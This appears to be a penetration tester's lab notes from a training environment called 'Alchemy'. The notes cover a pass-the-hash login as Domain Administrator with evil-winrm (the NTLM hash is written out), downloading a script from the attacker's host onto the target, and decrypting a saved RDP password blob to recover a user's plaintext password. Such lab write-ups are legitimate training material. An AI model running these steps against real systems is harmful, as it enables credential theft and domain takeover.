### Github
#rdp-file-password-encryptor #rdp-file-password-decryptor
- downloaded this tool to decrypt the `ws01.rdp`
https://github.com/RedAndBlueEraser/rdp-file-password-encryptor
![[Pasted image 20240627140640.png]]
##### Setting up python3 -m http.server 
#pythonserver 
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[27Jun2024 14:25:09]-[/home/â€¦/SUT/Alchemy/DC_172.16.0.2/rdp-file-password-encryptor]
â””â”€# python3 -m http.server 8002 
Serving HTTP on 0.0.0.0 port 8002 (http://0.0.0.0:8002/) ...
10.10.110.1 - - [27/Jun/2024 14:36:57] "GET /rdp-file-password-decryptor.ps1 HTTP/1.1" 200 -
10.10.110.1 - - [27/Jun/2024 14:37:55] "GET /rdp-file-password-decryptor.ps1 HTTP/1.1" 200 -
10.10.110.1 - - [27/Jun/2024 14:40:38] "GET /rdp-file-password-decryptor.ps1 HTTP/1.1" 200 -
10.10.110.1 - - [27/Jun/2024 14:46:39] "GET /rdp-file-password-decryptor.ps1 HTTP/1.1" 200 -
10.10.110.1 - - [27/Jun/2024 14:49:08] "GET /rdp-file-password-decryptor.ps1 HTTP/1.1" 200 -
```
##### evil-winrm as Domain Administrator
#evil-winrm 
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[27Jun2024 14:32:19]-[/home/kali]
â””â”€# proxychains evil-winrm -i 172.16.0.2 -u Administrator -H 731c191234d0934dee79dd57169c6da7  

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
alchemy\administrator
```
##### Invoke Web-Request 
```bash
*Evil-WinRM* PS C:\windows\temp> Invoke-WebRequest -Uri "http://10.10.14.39:8002/rdp-file-password-decryptor.ps1" -OutFile "C:\windows\temp\rdp-file-password-decryptor.ps1"  
```
##### Checking to ensure the file was there
![[Pasted image 20240627151057.png]]
##### Grab the hash from ws01.rdp
![[Pasted image 20240627151436.png]]
```bash
01000000D08C9DDF0115D1118C7A00C04FC297EB01000000A74D232999DCAA479430EF171E6D4FAD0000000002000000000003660000C000000010000000C3590AAA42F82FFA95833106EB994BBB0000000004800000A0000000100000009811006F7DF8DF0BB4DB973E11E6603C20000000D955D5B91E234B16F3E52A683096EE5BC60B690BBD42ECE424CE36B7C9CD17D414000000B542DA5BA10CBD5C77EF075D822F0F7A1FFD77C0             
```
##### Using the rdp-file-password-decryptor.ps1
#rdp-file-password-decryptor 
- got new password `UaqcsvzMxEjZ` for `calde` user, added to [[Loot-User List-Flags]]
![[Pasted image 20240627152002.png]]
```bash
*Evil-WinRM* PS C:\windows\temp> .\rdp-file-password-decryptor.ps1 01000000D08C9DDF0115D1118C7A00C04FC297EB01000000A74D232999DCAA479430EF171E6D4FAD0000000002000000000003660000C000000010000000C3590AAA42F82FFA95833106EB994BBB0000000004800000A0000000100000009811006F7DF8DF0BB4DB973E11E6603C20000000D955D5B91E234B16F3E52A683096EE5BC60B690BBD42ECE424CE36B7C9CD17D414000000B542DA5BA10CBD5C77EF075D822F0F7A1FFD77C0
UaqcsvzMxEjZ
```